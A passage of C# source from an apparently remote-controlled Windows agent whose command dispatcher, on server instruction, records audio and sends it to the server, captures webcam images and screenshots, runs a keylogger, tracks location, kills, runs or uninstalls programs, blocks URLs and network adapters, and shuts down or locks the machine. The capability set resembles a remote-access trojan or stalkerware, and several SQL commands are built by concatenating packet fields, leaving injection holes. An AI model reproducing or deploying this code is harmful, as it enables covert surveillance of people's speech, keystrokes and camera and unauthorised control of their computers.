                    Data = new byte[Data.Length];
                    Data[0] = 2;
                    Key.SetValue("WindowsAgentSpare", Data);
                }


            }
            catch (Exception E)
            {

            }
        }

        private void BeforSystemLimitElipced(object sender, ElapsedEventArgs e)
        {
            try
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer Finded = System2Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["SystemLimit"].Rows.Find(Finded.ID);
                DateTime TempDate = (DateTime)Row["StartTime"];
                DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["StartTime"] = Start;
                TempDate = (DateTime)Row["EndTime"];
                Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["EndTime"] = Start;
                DataBaseAgent.InsertData(DS.Tables["SystemLimit"]);
                Finded.TimeWatcher.Stop();
                //Finded.TimeWatcher.Elapsed -= BeforSystemLimitElipced;
                //Finded.TimeWatcher.Elapsed += EndSystemLimitElipced;
                Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
                Finded.TimeWatcher.Start();
                //DataBaseAgent.SelectData("SystemLimit", ref DS, "*","SystemLimit" , ID,"ID");
                //DS.Tables.Remove("SystemLimitAct");
                //System2Timer.Remove(System2Timer.Find(x => x.TimeWatcher == Target));
                DoSystem((short)Row["Act"]);
            }
            catch (Exception EE)
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 Finded = System3Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["SystemLimit"].Rows.Find(Finded.ID);
                DateTime TempDate = (DateTime)Row["StartTime"];
                DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["StartTime"] = Start;
                TempDate = (DateTime)Row["EndTime"];
                Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["EndTime"] = Start;
                DataBaseAgent.InsertData(DS.Tables["SystemLimit"]);
                Finded.TimeWatcher.Stop();
                Finded.STW.Stop();
                Row["Remaining"] = ((TimeSpan)Row["Duration"] - Finded.STW.Elapsed).TotalMinutes;
                DataBaseAgent.InsertData(DS.Tables["SystemLimit"]);
                //Finded.TimeWatcher.Elapsed -= BeforSystemLimitElipced;
                //Finded.TimeWatcher.Elapsed += EndSystemLimitElipced;
                //Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
                //Finded.TimeWatcher.Start();

                //DataBaseAgent.SelectData("SystemLimit", ref DS, "*","SystemLimit" , ID,"ID");
                //DS.Tables.Remove("SystemLimitAct");
                //System2Timer.Remove(System2Timer.Find(x => x.TimeWatcher == Target));
                DoSystem((short)Row["Act"]);
            }
        }

        //private void EndSystemLimitElipced(object sender, ElapsedEventArgs e)
        //{
        //    try
        //    {
        //        System.Timers.Timer Target = sender as System.Timers.Timer;
        //        MyTimer Finded = System2Timer.Find(x => x.TimeWatcher == Target);
        //        DataRow Row = DS.Tables["SystemLimit"].Rows.Find(Finded.ID);
        //        DateTime TempDate = (DateTime)Row["StartTime"];
        //        DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
        //        Row["StartTime"] = Start;
        //        TempDate = (DateTime)Row["EndTime"];
        //        Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
        //        Row["EndTime"] = Start;
        //        DS.Tables["SystemLimit"].AcceptChanges();
        //        Finded.TimeWatcher.Stop();
        //        Finded.TimeWatcher.Elapsed -= BeforSystemLimitElipced;
        //        Finded.TimeWatcher.Elapsed += EndSystemLimitElipced;
        //        Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
        //        Finded.TimeWatcher.Start();
        //
        //        //DataBaseAgent.SelectData("SystemLimit", ref DS, "*","SystemLimit" , ID,"ID");
        //        //DS.Tables.Remove("SystemLimitAct");
        //        //System2Timer.Remove(System2Timer.Find(x => x.TimeWatcher == Target));
        //        //DoSystem(DS.Tables["SystemLimit"].Rows[0]["Act"].ToString());
        //    }
        //    catch (Exception EE)
        //    {
        //        System.Timers.Timer Target = sender as System.Timers.Timer;
        //        MyTimer3 Finded = System3Timer.Find(x => x.TimeWatcher == Target);
        //        DataRow Row = DS.Tables["SystemLimit"].Rows.Find(Finded.ID);
        //        DateTime TempDate = (DateTime)Row["StartTime"];
        //        DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
        //        Row["StartTime"] = Start;
        //        TempDate = (DateTime)Row["EndTime"];
        //        Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
        //        Row["EndTime"] = Start;
        //        DS.Tables["SystemLimit"].AcceptChanges();
        //        Finded.TimeWatcher.Stop();
        //        Finded.TimeWatcher.Elapsed -= BeforSystemLimitElipced;
        //        Finded.TimeWatcher.Elapsed += EndSystemLimitElipced;
        //        Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
        //        Finded.TimeWatcher.Start();
        //
        //        //DataBaseAgent.SelectData("SystemLimit", ref DS, "*","SystemLimit" , ID,"ID");
        //        //DS.Tables.Remove("SystemLimitAct");
        //        //System2Timer.Remove(System2Timer.Find(x => x.TimeWatcher == Target));
        //        //DoSystem(DS.Tables["SystemLimit"].Rows[0]["Act"].ToString());
        //    }
        //}
        public void RunMs()
        {
            MessageRecived(Type, ReData, ReID);
            ReTask = new Thread(new ThreadStart(RunMs));
        }
        public void MessageRecived(short Type, string Data, string ID)
        {
            //if (Lock == false)
            try
            {
                {

                    Lock = true;
                    switch (Type)
                    {
                        case (short)Packet.PacketType.RecordVoice:
                            {
                                Packet Pack = new Packet();
                                Packet.RecordVoice Pac = Pack.ToPacket<Packet.RecordVoice>(Data);
                                if (Pac.State == true)
                                {
                                    if (Pac.ProcessName == "")
                                    {
                                        VoiceAgent.StartRecording();
                                        DS.Tables["Data"].Rows[11]["DataContent"] = "VoiceRun";
                                    }
                                    else
                                    {
                                        DataBaseAgent.SelectData("VoiceProcess", ref DS, "VoiceProcess");
                                        DataRow Row = DS.Tables["VoiceProcess"].NewRow();
                                        Row["ProcessName"] = Pac.ProcessName.Replace(".exe", "");
                                        DS.Tables["VoiceProcess"].Rows.Add(Row);
                                        DataBaseAgent.InsertData(DS.Tables["VoiceProcess"]);
                                        DS.Tables.Remove("VoiceProcess");
                                    }
                                }
                                else
                                {
                                    if (Pac.ProcessName == "")
                                    {
                                        if (VoiceAgent.Runing == true)
                                        {
                                            DS.Tables["Data"].Rows[11]["DataContent"] = "";
                                            Task.Run(() =>
                                            {
                                                string TimeName = DateTime.Now.Millisecond.ToString();
                                                VoiceAgent.StopRecording(Application.StartupPath, TimeName, ".mp3");
                                                string Voice = Convert.ToBase64String(File.ReadAllBytes(Application.StartupPath + TimeName + ".mp3"));
                                                Packet.ProPacket ProVoice = new Packet.ProPacket();
                                                Packet.RecordVoice VoiceData = new Packet.RecordVoice();
                                                VoiceData.ProcessName = Voice;
                                                VoiceData.Time = DateTime.Now.ToString();
                                                ProVoice.Type = (short)Packet.PacketType.RecordVoice;
                                                ProVoice.ID = Connection.ID;
                                                ProVoice.TotalSize = Encoding.Unicode.GetByteCount(Voice);
                                                string DataVoice = Pack.ToString(VoiceData);
                                                string ProData = Pack.ToString(ProVoice);
                                                if (Connection.ConnectionIsAlive == true)
                                                {
                                                    Connection.SendFileDataSM.WaitOne();
                                                    Packet.MainPacket MPacket = new Packet.MainPacket();
                                                    MPacket.PPacket = ProData;
                                                    MPacket.Data = DataVoice;
                                                    //Connection.SendToServer(ProData);
                                                    Thread.Sleep(100);
                                                    Connection.SendToServer(Pack.ToString(MPacket));
                                                    Connection.SendFileDataSM.Release();
                                                }
                                                else
                                                {
                                                    DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                                                    RRow["ProPack"] = ProData;
                                                    RRow["IsFile"] = 1;
                                                    RRow["Data"] = DataVoice;
                                                    MeesageAdd.WaitOne();
                                                    RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                                                    Thread.Sleep(10);
                                                    DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                                                    MeesageAdd.Release();
                                                    DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                                                }
                                            });


                                        }

                                    }
                                    else
                                    {
                                        DataBaseAgent.ExequteWithCommand("Delete From VoiceProcess where ProcessName ='" + Pac.ProcessName + "'");
                                    }

                                }
                            }; break;
                        case (short)Packet.PacketType.WebCam:
                            {
                                Packet Pack = new Packet();
                                Packet.WebCam Pac = Pack.ToPacket<Packet.WebCam>(Data);
                                if (Pac.State == true)
                                {
                                    if (Pac.ProcessName == "")
                                    {
                                        if (WebcamAgent.Runing == false)
                                        {
                                            WebcamAgent = new Webcam();
                                            //WebcamAgent.StartWebCam();

                                        }
                                        if (Pac.Type == (short)Packet.WebCamType.Picture)
                                        {
                                            Task.Run(() =>
                                            {
                                                WebcamAgent.TakePicture(TakePic);

                                            });

                                        }
                                    }
                                    else
                                    {
                                        DataBaseAgent.SelectData("WebCamProcess", ref DS, "WebCamProcess");
                                        DataRow Row = DS.Tables["WebCamProcess"].NewRow();
                                        Row["ProcessName"] = Pac.ProcessName.Replace(".exe", "");
                                        Row["Type"] = Pac.Type;
                                        DS.Tables["WebCamProcess"].Rows.Add(Row);
                                        DataBaseAgent.InsertData(DS.Tables["WebCamProcess"]);
                                        DS.Tables.Remove("WebCamProcess");
                                    }

                                }
                                else
                                {
                                    if (Pac.ProcessName == "")
                                    {
                                        if (WebcamAgent.Runing == true)
                                        {
                                            WebcamAgent.StopWebCam();
                                        }
                                    }
                                    else
                                    {
                                        DataBaseAgent.ExequteWithCommand("Delete From WebCamProcess where ProcessName ='" + Pac.ProcessName + "'");
                                    }

                                }
                            }; break;
                        case (short)Packet.PacketType.Keylogger:
                            {
                                Packet Pack = new Packet();
                                Packet.KeyLogger Pac = Pack.ToPacket<Packet.KeyLogger>(Data);
                                if (Pac.State == true)
                                {
                                    if (Pac.ProcessName == "")
                                    {
                                        if (KeyAgent.Runing == false)
                                        {
                                            KeyAgent.StartHogger();
                                            DS.Tables["Data"].Rows[12]["DataContent"] = "KeyLoggerRun";
                                        }
                                    }
                                    else
                                    {
                                        DataBaseAgent.SelectData("KeyloggerProcess", ref DS, "KeyloggerProcess");
                                        DataRow Row = DS.Tables["KeyloggerProcess"].NewRow();
                                        Row["ProcessName"] = Pac.ProcessName.Replace(".exe", "");
                                        DS.Tables["KeyloggerProcess"].Rows.Add(Row);
                                        DataBaseAgent.InsertData(DS.Tables["KeyloggerProcess"]);
                                        DS.Tables.Remove("KeyloggerProcess");
                                    }

                                }
                                else
                                {
                                    if (Pac.ProcessName == "")
                                    {
                                        DS.Tables["Data"].Rows[12]["DataContent"] = "";
                                        if (KeyAgent.Runing == true)
                                        {

                                            KeyAgent.StopLogger();
                                        }
                                    }
                                    else
                                    {
                                        DataBaseAgent.ExequteWithCommand("delete From KeyloggerProcess where ProcessName ='" + Pac.ProcessName + "'");
                                    }

                                }
                            }; break;
                        case (short)Packet.PacketType.Location:
                            {
                                MyPlace.StopLocating();
                                MyPlace.StartLocating();
                            }; break;
                        case (short)Packet.PacketType.URL:
                            {
                                Packet Pack = new Packet();
                                Packet.URL Pac = Pack.ToPacket<Packet.URL>(Data);
                                switch (Pac.Type)
                                {
                                    case (short)Packet.URLType.Block:
                                        {
                                            // write To filel 

                                            DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURL");
                                            DataRow Row = DS.Tables["BlockURL"].NewRow();
                                            //DS.Tables.Remove("BlockURLAd");
                                            string[] UR = Pac.Address.Split('$');
                                            Row["URL"] = UR[0];
                                            Row["Act"] = Pac.Type;
                                            Monitor.Enter(NewID);
                                            Row["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
                                            Monitor.Exit(NewID);
                                            Row["Redirect"] = UR[1];
                                            DS.Tables["BlockURL"].Rows.Add(Row);
                                            //DS.Tables["BlockURL"].AcceptChanges();
                                            DataBaseAgent.InsertData(DS.Tables["BlockURL"]);
                                        }; break;
                                    case (short)Packet.URLType.BlockWithError:
                                        {
                                            // write To filel 
                                            DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURLAd");
                                            DataRow Row = DS.Tables["BlockURLAd"].NewRow();
                                            DS.Tables.Remove("BlockURLAd");
                                            string[] UR = Pac.Address.Split('$');
                                            Row["URL"] = UR[0];
                                            Row["Act"] = Pac.Type;
                                            Row["Redirect"] = UR[1];
                                            DS.Tables["BlockURL"].Rows.Add(Row);
                                            DataBaseAgent.InsertData(DS.Tables["BlockURL"]);
                                        }; break;
                                    case (short)Packet.URLType.Disable:
                                        {
                                            DataBaseAgent.ExequteWithCommand("Delete From BlockURL where URL ='" + Pac.Address + "'");
                                            //DS.Tables.Remove("BlockURL");
                                        }; break;
                                }
                                ////$$$$$$$$$$$$$$$$$$$$$$
                            }; break;
                        case (short)Packet.PacketType.Apps:
                            {
                                Packet Pack = new Packet();
                                Packet.Apps Pac = Pack.ToPacket<Packet.Apps>(Data);
                                DataBaseAgent.SelectData("InstalledApps", ref DS, "AppID ,DisplayName , UninstallString", "TargetApp", Pac.AppName, "AppID");
                                DataRow Row = null;
                                try
                                {
                                    Row = DS.Tables["TargetApp"].Rows[0];
                                }
                                catch (Exception E)
                                {

                                }

                                DS.Tables.Remove("TargetApp");

                                switch (Pac.Type)
                                {
                                    case (short)Packet.AppsType.Block:
                                        {
                                            try
                                            {
                                                //DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
                                                DataRow BlockRow = DS.Tables["AppsBlock"].NewRow();

                                                BlockRow["AppName"] = Row["DisplayName"];
                                                BlockRow["AppID"] = Row["AppID"];
                                                BlockRow["Act"] = Pac.Type;
                                                Monitor.Enter(NewID);
                                                BlockRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NewID()");
                                                Monitor.Exit(NewID);
                                                //DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
                                                DS.Tables["AppsBlock"].Rows.Add(BlockRow);
                                                //DS.Tables["AppsBlock"].AcceptChanges();
                                                DataBaseAgent.InsertData(DS.Tables["AppsBlock"]);
                                                //DS.Tables.Remove("AppsBlock");
                                            }
                                            catch (Exception E)
                                            {

                                            }

                                        }; break;
                                    case (short)Packet.AppsType.RemoveBlock:
                                        {
                                            //DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
                                            //DataRow BlockRow = DS.Tables["AppsBlockAd"].NewRow();
                                            //DS.Tables.Remove("AppsBlockAd");
                                            //BlockRow["AppName"] = Row["AppName"];
                                            ////BlockRow["AppID"] = Row["AppID"];
                                            //BlockRow["Act"] = Pac.Type;
                                            //BlockRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NewID()");
                                            //DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
                                            //DS.Tables["AppsBlock"].Rows.Add(BlockRow);
                                            ////DS.Tables["AppsBlock"].AcceptChanges();
                                            //DataBaseAgent.InsertData(DS.Tables["AppsBlock"]);
                                            DataBaseAgent.ExequteWithCommand("Delete From AppsBlock where AppName ='" + Pac.AppName.ToString() + "'");

                                        }; break;
                                    case (short)Packet.AppsType.BlockWithErro:
                                        {
                                            DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlockAd");
                                            DataRow BlockRow = DS.Tables["AppsBlockAd"].NewRow();
                                            DS.Tables.Remove("AppsBlockAd");
                                            BlockRow["AppName"] = Row["AppName"];
                                            BlockRow["AppID"] = Row["AppID"];
                                            BlockRow["Act"] = Pac.Type;
                                            DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
                                            DS.Tables["AppsBlock"].Rows.Add(BlockRow);
                                            DataBaseAgent.InsertData(DS.Tables["AppsBlock"]);
                                        }; break;
                                    case (short)Packet.AppsType.Close:
                                        {
                                            Process Target = new Process();
                                            Target = ProcessHandler.GetSpecificProcess(Convert.ToInt32(Pac.AppName.Split('-')[2]));
                                            //foreach (Process var in Target.FindAll(x => x.ProcessName == Pac.AppName.Split('-')[0].Replace(".exe", "")))
                                            //{
                                            //    var.Kill();
                                            //}
                                            Target.Kill();
                                        }; break;
                                    case (short)Packet.AppsType.Run:
                                        {
                                            AppTools.RunApp(Pac.AppName);
                                        }; break;
                                    case (short)Packet.AppsType.Uninstall:
                                        {
                                            DataBaseAgent.SelectData("InstalledApps", ref DS, "AppID ,DisplayName , UninstallString", "TargetApp", Pac.AppName.Split('$')[0], "DisplayName");
                                            Row = DS.Tables["TargetApp"].Rows[0];
                                            AppTools.Uninstall(Row["UninstallString"].ToString());
                                            DS.Tables.Remove("TargetApp");
                                        }; break;
                                }
                            }; break;

                        case (short)Packet.PacketType.ScrrenShot:
                            {
                                Packet Pack = new Packet();
                                Packet.ScrrenShot Pac = Pack.ToPacket<Packet.ScrrenShot>(Data);
                                switch (Pac.Type)
                                {
                                    case (short)Packet.ScrrenShotType.OneTime:
                                        {
                                            Connection.TakeScreenShot();
                                            //string Pic = ScreenShot.FullScreenShot(1);
                                            //Packet.ScrrenShot SC = new Packet.ScrrenShot();
                                            //SC.Picture = Pic;
                                            //SC.Type = (short)Packet.ScrrenShotType.OneTime;
                                            //SC.End = DateTime.Now;
                                            //SC.Start = SC.End;
                                            //Packet.ProPacket ProSC = new Packet.ProPacket();
                                            //ProSC.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                                            //ProSC.Type = (short)Packet.PacketType.ScrrenShot;
                                            //string Data = Pack.ToString(SC);
                                            //ProSC.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                                            //string ProData = Pack.ToString(ProSC);
                                            //Connection.SendDataSM.WaitOne();
                                            //Connection.SendToServer(ProData);
                                            //Connection.SendToServer(Data);
                                            //Connection.SendDataSM.Release();
                                        }; break;
                                    case (short)Packet.ScrrenShotType.Sequence:
                                        {
                                            TimeWatcher.Interval = Convert.ToDouble(Pac.Header);
                                            TimeWatcher.Elapsed += TimeWatcher_Elapsed;
                                            //TimeWatcher.AutoReset = true;
                                            Remainning = (Pac.End - Pac.Start).TotalDays;

                                        }; break;
                                    //case (short)Packet.ScrrenShotType.Counter:
                                    //    {
                                    //
                                    //    }break;
                                    case (short)Packet.ScrrenShotType.RealTime:
                                        {
                                            //Connection.RealTimeMonitoring()
                                        }; break;
                                }

                            }; break;

                        case (short)Packet.PacketType.SystemStart_Down:
                            {
                                Packet Pack = new Packet();
                                Packet.SystemStatus Pac = Pack.ToPacket<Packet.SystemStatus>(Data);
                                switch (Pac.Type)
                                {
                                    case (short)Packet.SystemStatusType.Down:
                                        {
                                            DoSystem(Pac.Type);
                                        }; break;
                                    case (short)Packet.SystemStatusType.Reboot:
                                        {
                                            DoSystem(Pac.Type);
                                        }; break;
                                    case (short)Packet.SystemStatusType.Logoff:
                                        {
                                            DoSystem(Pac.Type);
                                        }; break;
                                    case (short)Packet.SystemStatusType.Lock:
                                        {
                                            DoSystem(Pac.Type);
                                        }; break;
                                    //case (short)Packet.SystemStatusType.Hiber:
                                    //    {
                                    //        DoSystem("Hibernation");
                                    //    }; break;
                                    case (short)Packet.SystemStatusType.Sleep:
                                        {
                                            DoSystem(Pac.Type);
                                        }; break;
                                }

                            }; break;

                        case (short)Packet.PacketType.NetworkCommands:
                            {
                                Packet Pack = new Packet();
                                Packet.NetworkCommands Pac = Pack.ToPacket<Packet.NetworkCommands>(Data);
                                switch (Pac.Type)
                                {

                                    case (short)Packet.NetworkCommandsType.Enable:
                                        {
                                            NetWork.Enable(Pac.Command);
                                        }; break;
                                    case (short)Packet.NetworkCommandsType.Disable:
                                        {
                                            NetWork.Disable(Pac.Command);
                                        }; break;
                                    case (short)Packet.NetworkCommandsType.EnableWithTime:
                                        {
                                            string[] TimeTemp = Pac.Command.Split('$');
                                            DateTime TempDate = Convert.ToDateTime(TimeTemp[3]);
                                            DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                                            TempDate = Convert.ToDateTime(TimeTemp[2]);
                                            DateTime End = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                                            DateTime TempTime = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, 0, 0, 0);
                                            DataBaseAgent.SelectData("NetworkLimit", ref DS, "NetworkLimit");
                                            DataRow Row = DS.Tables["NetworkLimit"].NewRow();
                                            Row["StartTime"] = (Start - TempTime);
                                            Row["EndTime"] = (End - TempTime);

                                            Row["Name"] = TimeTemp[1];
                                            Row["ID"] = TimeTemp[0];
                                            Row["Act"] = (short)Packet.NetworkCommandsType.Disable;
                                            DS.Tables["NetworkLimit"].Rows.Add(Row);
                                            DataBaseAgent.InsertData(DS.Tables["NetworkLimit"]);
                                            DS.Tables.Remove("NetworkLimit");
                                            System.Timers.Timer Temp = new System.Timers.Timer();
                                            if (DateTime.Now.CompareTo(Start) < 0)
                                            {
                                                MyTimer TimeWatcher = new MyTimer();
                                                System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                                Target.Elapsed += BeforNetworkLimitElipced;
                                                Target.Start();
                                                TimeWatcher.TimeWatcher = Target;
                                                TimeWatcher.ID = Row["ID"].ToString();
                                                NetWork2Timer.Add(TimeWatcher);
                                            }
                                            else
                                            {
                                                if ((DateTime.Now.CompareTo(Start) >= 0) && ((DateTime.Now.CompareTo(End) <= 0)))
                                                {
                                                    NetWork.Disable(Row["Name"].ToString());
                                                }

                                            }
                                        }; break;
                                    case (short)Packet.NetworkCommandsType.DisableWithTime:
                                        {
                                            //string[] TimeTemp = Pac.Command.Split('$');
                                            //DateTime TempDate = Convert.ToDateTime(TimeTemp[3]);
                                            //DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                                            //TempDate = Convert.ToDateTime(TimeTemp[2]);
                                            //DateTime End = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                                            try
                                            {

                                                DataBaseAgent.ExequteWithCommand(("delete From Networklimit where ID = '" + Pac.Command + "'"));
                                                foreach (DataRow var in DS.Tables["Networklimit"].Rows)
                                                {
                                                    if (var["ID"].ToString() == Pac.Command)
                                                    {
                                                        DS.Tables["Networklimit"].Rows.Remove(var);
                                                    }
                                                }
                                                //SqlCommand Command = new SqlCommand();
                                                //Command.Connection = new SqlConnection(DataBaseAgent.ConnectionString);
                                                //Command.CommandText = ("DELETE FROM Networklimit WHERE ID = '" + DS.Tables["NetworkLimitDis"].Rows[0]["ID"] + "'");
                                                //Command.ExecuteNonQuery();
                                            }
                                            catch (Exception rr)
                                            {

                                            }

                                        }; break;
                                }

                            }; break;
                        case (short)Packet.PacketType.SystemLimition2Time:
                            {
                                Packet Pack = new Packet();
                                Packet.SystemLimition2Time Pac = Pack.ToPacket<Packet.SystemLimition2Time>(Data);
                                switch (Pac.Act)
                                {
                                    case (short)Packet.SystemLimitAct.ShutDown:
                                        {
                                            try
                                            {
                                                if (DS.Tables.Contains("SystemLimit") == false)
                                                {
                                                    DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
                                                }
                                                DataRow Row = DS.Tables["SystemLimit"].NewRow();
                                                Row["Start"] = Pac.Start;
                                                Row["End"] = Pac.End;
                                                Row["ID"] = Pac.Id;
                                                Row["Act"] = (short)Packet.SystemLimitAct.ShutDown;
                                                //DS.Tables.Remove("SystemLimitAd");
                                                //DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimitAd");
                                                DS.Tables["SystemLimit"].Rows.Add(Row);
                                                //DS.Tables["SystemLimit"].AcceptChanges();
                                                DataBaseAgent.InsertData(DS.Tables["SystemLimit"]);
                                                //DS.Tables.Remove("SystemLimit");
                                            }
                                            catch (Exception R)
                                            {
                                                MessageBox.Show("Error");
                                            }
                                            if (DateTime.Now.CompareTo(Pac.Start) < 0)
                                            {
                                                MyTimer TimeWatcher = new MyTimer();
                                                System.Timers.Timer Target = new System.Timers.Timer((Pac.Start - DateTime.Now).TotalMilliseconds);
                                                Target.Elapsed += BeforSystemLimitElipced;
                                                Target.Start();
                                                TimeWatcher.TimeWatcher = Target;
                                                TimeWatcher.ID = Pac.Id;
                                                System2Timer.Add(TimeWatcher);
                                            }
                                            else
                                            {
                                                if ((DateTime.Now.CompareTo(Pac.Start) >= 0) && ((DateTime.Now.CompareTo(Pac.End) <= 0)))
                                                {
                                                    DoSystem((short)Packet.SystemLimitAct.ShutDown);
                                                }
                                            }

                                        }; break;
                                    case (short)Packet.SystemLimitAct.Disable:
                                        {
                                            try
                                            {
                                                System2Timer.Remove(System2Timer.Find(x => x.ID == Pac.Id));
                                                SqlCommand Command = new SqlCommand();
                                                Command.Connection = new SqlConnection(DataBaseAgent.ConnectionString);
                                                Command.CommandText = "Delete From SystemLimit where ID = '" + Pac.Id + "'";
                                                Command.ExecuteNonQuery();
                                            }
                                            catch (Exception T)
                                            {

                                            }
                                        }; break;
                                }

                            }; break;
                        case (short)Packet.PacketType.SystemLimition3Time:
                            {
                                Packet Pack = new Packet();
                                Packet.SystemLimition3Time Pac = Pack.ToPacket<Packet.SystemLimition3Time>(Data);
                                switch (Pac.Act)
                                {
                                    case (short)Packet.SystemLimitAct.ShutDown:
                                        {
                                            try
                                            {
                                                if (DS.Tables.Contains("SystemLimit") == false)
                                                {
                                                    DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
                                                }
                                                DataRow Row = DS.Tables["SystemLimit"].NewRow();
                                                Row["StatTime"] = Pac.Start;
                                                Row["EndTime"] = Pac.End;
                                                Row["ID"] = Pac.Id;
                                                Row["Act"] = (short)Pac.Act;
                                                Row["Duration"] = Pac.Duration;
                                                //DS.Tables.Remove("SystemLimitAd");
                                                //DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimitAd");
                                                DS.Tables["SystemLimit"].Rows.Add(Row);
                                                DataBaseAgent.InsertData(DS.Tables["SystemLimit"]);
                                                //DS.Tables.Remove("SystemLimit");
                                            }
                                            catch (Exception R)
                                            {
                                                MessageBox.Show("Error");
                                            }
                                            DateTime TempTime1 = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, Pac.Start.Hours, Pac.Start.Minutes, Pac.Start.Seconds);
                                            if ((DateTime.Now.CompareTo(TempTime1) < 0))
                                            {
                                                MyTimer3 TimeWatcher = new MyTimer3();
                                                DateTime TempTime = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, 0, 0, 0);
                                                System.Timers.Timer Target = new System.Timers.Timer((Pac.Start).TotalMilliseconds);
                                                System.Timers.Timer Duration = new System.Timers.Timer((Pac.Duration).TotalMilliseconds);
                                                Target.Elapsed += BeforSystemLimitElipced;
                                                Duration.Elapsed += Duration_Elapsed;
                                                Target.Start();
                                                Duration.Start();
                                                TimeWatcher.STW = new Stopwatch();
                                                TimeWatcher.STW.Start();
                                                TimeWatcher.TimeWatcher = Target;
                                                TimeWatcher.Duration = Duration;
                                                TimeWatcher.ID = Pac.Id;
                                                System3Timer.Add(TimeWatcher);
                                            }
                                            else
                                            {
                                                if ((DateTime.Now.CompareTo(Pac.Start) >= 0) && ((DateTime.Now.CompareTo(Pac.End) <= 0)))
                                                {
                                                    DoSystem((short)Packet.SystemLimitAct.ShutDown);
                                                }
                                            }

                                        }; break;
                                    case (short)Packet.SystemLimitAct.Disable:
                                        {
                                            try
                                            {
                                                System3Timer.Remove(System3Timer.Find(x => x.ID == Pac.Id));
                                                DataBaseAgent.ExequteWithCommand("Delete From SystemLimit where ID = '" + Pac.Id + "'");
                                                foreach (DataRow var in DS.Tables["SystemLimit"].Rows)
                                                {
                                                    if (var["ID"].ToString() == Pac.Id)
                                                    {
                                                        DS.Tables["SystemLimit"].Rows.Remove(var);
                                                    }
                                                }
                                            }
                                            catch (Exception T)
                                            {

                                            }
                                        }; break;
                                }


                            }; break;
                        case (short)Packet.PacketType.AppLimition2Time:
                            {
                                Packet Pack = new Packet();
                                Packet.AppLimition2Time Pac = Pack.ToPacket<Packet.AppLimition2Time>(Data);
                                string[] Data1 = Pac.AppName.Split('$');
                                switch (Pac.Act)
                                {
                                    case (short)Packet.AppLimitAct.Close:
                                        {

                                            try
                                            {
                                                if (DS.Tables.Contains("AppLimit") == false)
                                                {
                                                    DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimit");
                                                }
                                                DataRow Row = DS.Tables["AppLimit"].NewRow();
                                                Row["Start"] = Pac.Start;
                                                Row["End"] = Pac.End;
                                                Row["ID"] = Pac.AppName;
                                                Row["Act"] = (short)Packet.AppLimitAct.Close;
                                                //DS.Tables.Remove("AppLimitAd");
                                                //DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimitAd");
                                                DS.Tables["AppLimit"].Rows.Add(Row);
                                                //DS.Tables["AppLimit"].AcceptChanges();
                                                DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                                                //DS.Tables.Remove("AppLimit");
                                            }
                                            catch (Exception R)
                                            {
